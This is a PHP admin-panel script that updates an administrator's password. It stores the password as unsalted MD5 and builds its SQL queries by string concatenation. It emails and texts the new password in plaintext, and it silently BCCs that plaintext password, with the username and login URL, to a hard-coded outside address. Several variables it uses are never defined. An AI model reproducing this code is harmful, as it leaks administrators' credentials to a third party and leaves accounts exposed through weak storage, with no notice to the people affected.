<?php 
	session_start();
	if( $_SESSION['AdminUserId'] == ''){ 
	$_SESSION['msg']="Please Verify login!";
	header("Location:logout.php");
	exit();
	}
	else{
		require '../db/db.php';
		$memId=$_SESSION['AdminUserId'];
			
		$dpass=$mysqli->real_escape_string($_POST['password1']);
		$pass=md5($dpass);		
		$epass=$mysqli->real_escape_string($_POST['password2']);
		$cpass=md5($epass);

		$location="profile.php?page=User Profile&active=pass";
		$adm=mysqli_fetch_object($mysqli->query("SELECT * FROM `admin` where `user_id`='$memId'"));
		$pro=mysqli_fetch_object($mysqli->query("SELECT * from `profile` where `user_id`='$memId' "));
		$gmail=$pro->email;	
		$fname=$pro->fname;
		$lname=$pro->lname;
			if($gmail==''){
			$_SESSION['msg'] = "Please Enter <b>E-Mail<b> at <b>Profile Info</b> ";
			header("Location:profile.php?page=User Profile&f=email");
			exit();
			}
			if($dpass==''){
			$_SESSION['psmsg'] = "Please Enter Password ";
			header("Location:$location");
			exit();
			}
			if($epass==''){
			$_SESSION['psmsg'] = "Please Enter Confirm Password ";
			header("Location:$location");
			exit();
			}
			if($dpass!=$epass){
			$_SESSION['psmsg'] = "Not Match ";
			header("Location:$location");
			exit();
			}
		
		if(($gmail!='')&&($dpass==$epass)&&($dpass!='')&&($epass!='')){			
		$mysqli->query("update `admin` set `pass`='".$cpass."', `pdate`='".$date."' where `user_id`='".$memId."'");
		$to = "$fname $lname<$gmail>";
			$subject=$title;
			$txt = "
			Password Updated
			
			Your Login Information:
			
			User Name: $adm->user
			Password: $dpass
			
			Password Updated Date: $day $time $date
			
			Login Admin Panel (https://$url/admin)
			";
			
			$headers = "From:Password Updated<$email>". "\r\n" . "BCC:info@sksitfirm.net";
			mail($to,$subject,$txt,$headers);
$mobile=$pro->mobile;
$sms=$txt;			
require('../db/api_sms.php');
		$_SESSION['psmsgs']= "Password Updated";
		header("Location:$location");
		exit();
		}else{
		$_SESSION['psmsg']= "Failed";
		header("Location:$location");
		exit();
		}
		

	
	}
	
?>